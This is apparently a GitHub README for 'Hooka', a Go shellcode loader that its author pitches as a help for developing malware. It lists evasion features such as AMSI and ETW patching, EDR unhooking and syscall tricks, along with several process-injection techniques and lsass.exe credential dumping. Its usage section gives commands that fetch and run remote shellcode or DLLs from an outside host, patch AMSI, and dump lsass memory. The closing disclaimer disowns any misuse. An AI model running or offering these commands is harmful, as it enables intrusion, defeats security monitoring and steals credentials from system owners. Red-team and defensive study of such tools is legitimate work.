<p align="center">
  <img src="assets/gopher.png" width="130" heigth="60" alt="Gopher"/>
  <h1 align="center">Hooka</h1>
  <p align="center">~ Shellcode loader, hooks detector and more written in Golang ~</p>
</p>

<p align="center">
  <a href="#introduction">Introduction</a> •
  <a href="#features">Features</a> •
  <a href="#usage">Usage</a> •
  <a href="#library">Library</a> •
  <a href="#contributing">Contributing</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

# Introduction

I started this project to create a powerful shellcode loader with a lot of malleable capabilities via CLI flags like detecting hooked functions, using Hell's and Galo's Gate techniques and more. Why in Golang? Because it's a great language to develop malware and this project can help with it by providing an stable API with some functions which can be really useful. If you have any question feel free to open an issue or whatever you want.

However I've also taken some code from [BananaPhone](https://github.com/C-Sto/BananaPhone) and [Doge-Gabh](https://github.com/timwhitez/Doge-Gabh) projects (thanks a lot to ***C-Sto*** and ***timwhitez***)

***Tested on x64, Windows 10***

# Features

- Get shellcode from remote URL or local file
- Shellcode reflective DLL injection (***sRDI***)
- ***AMSI*** and ***ETW*** patch
- Detects hooked functions (i.e. NtCreateThread)
- Compatible with base64 and hex encoded shellcode
- Hell's Gate + Halo's Gate technique
- Capable of unhooking functions via multiple techniques:
  - Classic unhooking
  - Full DLL unhooking
  - Perun's Fart technique

- Multiple shellcode injection techniques:
  - CreateRemoteThread
  - Fibers
  - CreateProcess
  - EarlyBirdAPC
  - UuidFromString

- Dump lsass.exe process to a file
- Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
- Test mode (injects a calc.exe shellcode)

# Usage

Before using the project you should know that there are some functions from `ntdll.dll` that aren't usually hooked but they always appear to be hooked. Here you have all false positives:

```
NtGetTickCount
NtQuerySystemTime
NtdllDefWindowProc_A
NtdllDefWindowProc_W
NtdllDialogWndProc_A
NtdllDialogWndProc_W
ZwQuerySystemTime
```

- Just clone the repository like this:

```sh
git clone https://github.com/D3Ext/Hooka
cd Hooka
go build .
```

> Help panel
```
  _   _                   _              _
 | | | |   ___     ___   | | __   __ _  | |
 | |_| |  / _ \   / _ \  | |/ /  / _` | | |
 |  _  | | (_) | | (_) | |   <  | (_| | |_|
 |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)
 by D3Ext - v0.1

  -amsi
        overwrite AmsiScanBuffer memory address to patch AMSI (Anti Malware Scan Interface)
  -b64
        decode base64 encoded shellcode
  -dll string
        path to DLL you want to inject with function name sepparated by comma (i.e. evil.dll,xyz)
  -etw
        overwrite EtwEventWrite memory address to patch ETW (Event Tracing for Windows)
  -file string
        path to file where shellcode is stored
  -halos
        use Hell's Gate and Halo's Gate to resolve syscalls (not all injection techniques are covered)
  -hex
        decode hex encoded shellcode
  -hooks
        dinamically detect hooked functions by EDR
  -lsass string
        dump lsass.exe process memory into a file to extract credentials (run as admin)
  -remote-dll string
        remote url where DLL is stored, especify function separated by comma (i.e. http://192.168.1.37/evil.dll,xyz)
  -t string
        shellcode injection technique: CreateRemoteThread, Fibers, CreateProcess, EarlyBirdApc, UuidFromString (default: random)
  -test
        test shellcode injection capabilities by spawning a calc.exe
  -unhook int
        overwrite syscall memory address to bypass EDR : 1=classic, 2=full, 3=Perun's Fart
  -url string
        remote shellcode url (e.g. http://192.168.1.37/shellcode.bin)
```

> Detect hooked functions by EDR (including false positives)
```sh
.\Hooka.exe --hooks
```

> Test shellcode injection by spawning a calc.exe
```sh
.\Hooka.exe --test
```

- If no technique is especified it will use a random one

> Inject shellcode from URL or file
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin
.\Hooka.exe --file shellcode.bin
```

> Shellcode reflective dll injection (***sRDI***)
```sh
.\Hooka.exe --dll evil.dll,xyz
.\Hooka.exe --remote-dll http://192.168.1.37/evil.dll,xyz
```

> Decode shellcode as hex or base64
```sh
.\Hooka.exe --file shellcode.bin --hex
.\Hooka.exe --file shellcode.bin --b64
```

> Use Hell's Gate + Halo's Gate to bypass AVs/EDRs
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells -t CreateRemoteThread
```

> Unhook function before injecting shellcode
```sh
.\Hooka.exe --file shellcode.bin --unhook 3
```

> Patch AMSI and/or ETW
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --amsi
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --etw
```

As you can see Hooka provides a lot of CLI flags to help you in all kind of situations

# Demo

> Detecting hooks
<img src="assets/hooks.png">

> Injecting shellcode via CreateRemoteThread technique
<img src="assets/crt.png">

> Injecting shellcode using custom flags
<img src="assets/custom.png">

> Test function
<img src="assets/test.png">

> Dump lsass memory
<img src="assets/lsass.png">

# TODO

:black_square_button: Stable API for CLR functions

:black_square_button: More injection techniques

:black_square_button: `--pid` flag to handle process injection

:black_square_button: Sandboxing functions

:black_square_button: Native golang [Phant0m](https://github.com/hlldz/Phant0m) to suspend EventLog threads

:black_square_button: Integrated Seatbelt.exe using CLR

:black_square_button: Test unhooking functions against EDRs

# Library

To use the official package API see [here](https://github.com/D3Ext/Hooka/tree/main/examples)

# Contributing

Do you wanna improve the code with any idea or code optimization? You're in the right place

See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)

# References

```
https://github.com/C-Sto/BananaPhone
https://github.com/timwhitez/Doge-Gabh
https://github.com/Ne0nd0g/go-shellcode
https://github.com/trickster0/TartarusGate
https://github.com/Kara-4search/HookDetection_CSharp
https://github.com/RedLectroid/APIunhooker
https://github.com/plackyhacker/Peruns-Fart
https://github.com/chvancooten/maldev-for-dummies
https://blog.sektor7.net/#!res/2021/perunsfart.md
https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time
https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
```

# Disclaimer

Creator isn't in charge of any and has no responsibility for any kind of: illegal use of the project, malicious act, capable of causing damage to third parties

Use this project under your own responsability!

# Changelog

See [CHANGELOG.md](https://github.com/D3Ext/Hooka/blob/main/CHANGELOG.md)

# License

This project is licensed under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license

Copyright © 2023, *D3Ext*



